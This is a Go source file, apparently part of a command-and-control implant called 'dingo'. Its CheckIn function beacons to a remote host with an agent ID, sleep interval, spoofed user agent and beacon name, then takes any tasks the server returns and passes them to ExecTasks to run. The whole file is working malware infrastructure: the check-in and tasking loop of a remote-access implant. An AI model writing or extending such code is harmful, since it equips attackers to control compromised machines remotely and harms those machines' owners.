package check

import (
	"dingo/tasks"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

func CheckIn(rhost string, rport string, uri string, sleep *int, jitter int, listener string, agentid string, useragent string, key []byte, beacon_name string) error {
	url := "http://" + rhost + ":" + rport + "/" + uri

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		return err
	}
	req.Header.Add("AgentID", agentid)
	req.Header.Add("CallType", "Check")
	req.Header.Set("User-Agent", useragent)
	req.Header.Set("SLEEP", fmt.Sprint(*sleep))
	req.Header.Set("Name", beacon_name)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	bBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	sBody := string(bBody)

	// check for tasks
	if sBody != "ack check" {
		var taskRequest tasks.TaskRequestFromServer
		json.Unmarshal(bBody, &taskRequest)

		ExecTasks(taskRequest.Tasks, url, sleep, agentid, useragent, key, beacon_name)
	}

	return nil
}
